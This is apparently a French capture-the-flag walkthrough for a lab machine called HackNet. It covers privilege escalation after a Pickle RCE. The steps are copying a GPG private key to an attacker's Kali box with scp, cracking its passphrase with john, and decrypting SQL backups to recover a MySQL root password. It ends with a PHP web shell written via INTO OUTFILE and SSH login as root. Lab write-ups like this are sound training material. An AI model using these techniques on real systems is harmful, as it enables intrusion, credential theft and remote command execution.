# GPG Backup to Root

## <mark style="color:red;">GPG Backup to Root</mark>&#x20;

### <mark style="color:blue;">Contexte complet</mark>

Après avoir obtenu le shell Sandy via le **Pickle RCE sur le cache Django**, on commence la phase de post-exploitation. L'objectif est de monter en privilèges jusqu'à root en exploitant les fichiers de sauvegarde GPG.

***

### <mark style="color:blue;">Étape 1 — Reconnaissance du home Sandy</mark>

Une fois connecté en tant que Sandy, on explore son répertoire :

```bash
sandy@hacknet:~$ ls -la
```

```
drwx------ 7 sandy sandy    4096 Sep 18 09:48 .
drwxr-xr-x 4 root  root     4096 Jul  3  2024 ..
-rw------- 1 sandy www-data 3357 Sep 18 09:48 app_prod          ← clé SSH privée
-rw-r--r-- 1 sandy www-data  726 Sep 18 09:48 app_prod.pub      ← clé SSH publique
drwx------ 4 sandy sandy    4096 Sep 17 15:38 .gnupg            ← répertoire GPG
-rw-r--r-- 1 sandy www-data 1047 Sep 17 07:46 poc.py
drwxr-xr-x 2 sandy www-data 4096 Sep 18 09:51 .ssh
```

On explore le répertoire GPG :

```bash
sandy@hacknet:~$ cd .gnupg/private-keys-v1.d/
sandy@hacknet:~/.gnupg/private-keys-v1.d$ ls
```

```
0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
armored_key.asc                               ← clé GPG chiffrée (avec passphrase)
EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
```

***

### <mark style="color:blue;">Étape 2 — Découverte des backups chiffrés</mark>

```bash
sandy@hacknet:/var/www/HackNet/backups$ ls -la
```

```
total 56
drwxr-xr-x 2 sandy sandy  4096 Dec 29  2024 .
drwxr-xr-x 7 sandy sandy  4096 Feb 10  2025 ..
-rw-r--r-- 1 sandy sandy 13445 Dec 29  2024 backup01.sql.gpg
-rw-r--r-- 1 sandy sandy 13713 Dec 29  2024 backup02.sql.gpg
-rw-r--r-- 1 sandy sandy 13851 Dec 29  2024 backup03.sql.gpg
```

Trois dumps SQL chiffrés avec GPG. On ne peut pas les lire directement — il faut d'abord récupérer et déchiffrer la clé privée GPG.

***

### <mark style="color:blue;">Étape 3 — Exfiltration de la clé GPG vers notre machine</mark>

Depuis notre machine d'attaque (Kali), on utilise `scp` avec la clé SSH `app_prod` récupérée plus tôt :

```bash
┌──(kali㉿vbox)-[~]
└─$ scp -i app_prod sandy@10.10.11.85:~/.gnupg/private-keys-v1.d/armored_key.asc .
```

```
armored_key.asc     100% 2088    39.2KB/s   00:00
```

***

### Étape 4 — Crack de la passphrase GPG avec John

On convertit la clé GPG en un format crackable par John :

```bash
┌──(kali㉿vbox)-[~]
└─$ gpg2john armored_key.asc > hash
```

```
File armored_key.asc
```

On lance le bruteforce avec la wordlist rockyou :

```bash
┌──(kali㉿vbox)-[~]
└─$ john --format=gpg hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm) is 2 (SHA1)
Cost 3 (cipher algorithm) is 7 (AES128)
Will run 6 OpenMP threads

sweetheart       (Sandy)

1g 0:00:00:03 DONE (2025-09-18 10:04) 0.2645g/s 112.6p/s
Session completed.
```

**Passphrase trouvée : `sweetheart`**

***

### <mark style="color:blue;">Étape 5 — Import de la clé et déchiffrement des backups</mark>

On retourne sur le shell Sandy. On importe d'abord la clé privée dans le keyring GPG :

```bash
sandy@hacknet:/var/www/HackNet/backups$ gpg --import /home/sandy/.gnupg/private-keys-v1.d/armored_key.asc
```

```
gpg: key D72E5C1FA19C12F7: "Sandy (My key for backups) <sandy@hacknet.htb>" not changed
gpg: key D72E5C1FA19C12F7: secret key imported
gpg: Total number processed: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
```

On déchiffre les trois backups (la passphrase `sweetheart` sera demandée) :

```bash
sandy@hacknet:/var/www/HackNet/backups$ gpg --decrypt backup01.sql.gpg > ~/decryp1
sandy@hacknet:/var/www/HackNet/backups$ gpg --decrypt backup02.sql.gpg > ~/decryp2
sandy@hacknet:/var/www/HackNet/backups$ gpg --decrypt backup03.sql.gpg > ~/decryp3
```

```
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
# backup01 ✅ déchiffré
# backup02 ✅ déchiffré
# backup03 ❌ gpg: decryption failed: No secret key  ← chiffré avec une clé différente
```

***

### <mark style="color:blue;">Étape 6 — Script de déchiffrement automatisé (le script complet)</mark>

Voici le script bash présent sur la machine qui automatise tout ça :

```bash
#!/bin/bash

KEY_PATH="$HOME/.gnupg/private-keys-v1.d/armored_key.asc"
BACKUP_DIR="/var/www/HackNet/backups"
OUTPUT_DIR="/tmp"
PASSPHRASE="sweetheart"   # passphrase crackée avec john

# Import de la clé GPG
gpg --import "$KEY_PATH"

# Déchiffrement de chaque fichier .gpg
for file in "$BACKUP_DIR"/*.gpg; do
    filename=$(basename "$file" .gpg)
    outpath="$OUTPUT_DIR/$filename.sql"
    echo "[*] Déchiffrement de $file → $outpath"

    if [ -n "$PASSPHRASE" ]; then
        gpg --batch --yes \
            --passphrase "$PASSPHRASE" \
            --pinentry-mode loopback \
            -o "$outpath" \
            -d "$file"
    else
        gpg --batch --yes -o "$outpath" -d "$file"
    fi
done

echo "[*] Terminé. Fichiers déchiffrés dans $OUTPUT_DIR"
```

Usage :

```bash
chmod +x decrypt_backups.sh
./decrypt_backups.sh
```

***

### <mark style="color:blue;">Étape 7 — Extraction du mot de passe root</mark>

On cherche des credentials dans tous les dumps déchiffrés :

```bash
sandy@hacknet:~$ grep -r password
```

On trouve dans `decryp2` une conversation entre utilisateurs de la plateforme :

```sql
(47,'2024-12-29','Hey, can you share the MySQL root password with me? 
     I need to make some changes to the database.',1,22,18),

(48,'2024-12-29','The root password? What kind of changes are you planning?',
     1,18,22),

(50,'2024-12-29','Alright. But be careful, okay? 
     Here's the password: h4ck3rs4re3veRywh3re99. 
     Let me know when you are done.',1,18,22),
```

**Mot de passe root MySQL trouvé : `h4ck3rs4re3veRywh3re99`**

***

### <mark style="color:blue;">Étape 8 — Connexion MySQL en root et escalade</mark>

```bash
sandy@hacknet:~$ mysql -u root -p
Enter password: h4ck3rs4re3veRywh3re99
```

```sql
MariaDB [(none)]> show databases;
MariaDB [(none)]> use hacknet;
MariaDB [hacknet]> select * from socialnetwork_socialuser;
```

Depuis MySQL root, on peut potentiellement écrire un fichier ou exécuter des commandes selon la configuration :

```sql
-- Vérifier les privilèges FILE
MariaDB [(none)]> SELECT @@global.secure_file_priv;

-- Écrire une webshell si secure_file_priv est vide
MariaDB [(none)]> SELECT "<?php system($_GET['cmd']); ?>" 
                 INTO OUTFILE '/var/www/HackNet/shell.php';
```

Ou tenter une connexion SSH avec le même mot de passe :

```bash
ssh root@localhost
# password: h4ck3rs4re3veRywh3re99
```

***

### Résumé visuel de la chaîne complète

```
Django Cache (FileBasedCache)
         ↓
Pickle RCE → shell www-data / sandy
         ↓
Découverte : armored_key.asc + backups .sql.gpg
         ↓
scp → exfiltration sur Kali
         ↓
gpg2john → john → passphrase : "sweetheart"
         ↓
gpg --decrypt backup0{1,2}.sql.gpg
         ↓
grep password → h4ck3rs4re3veRywh3re99
         ↓
mysql -u root  OU  ssh root@localhost
         ↓
ROOT ✅
```

***

### Tableau récapitulatif

| Étape            | Outil               | Résultat                   |
| ---------------- | ------------------- | -------------------------- |
| Exfiltration clé | `scp`               | `armored_key.asc` récupéré |
| Crack passphrase | `gpg2john` + `john` | `sweetheart`               |
| Déchiffrement    | `gpg --decrypt`     | 2/3 backups lisibles       |
| Recherche creds  | `grep -r password`  | `h4ck3rs4re3veRywh3re99`   |
| Escalade         | `mysql` / `ssh`     | Accès root                 |
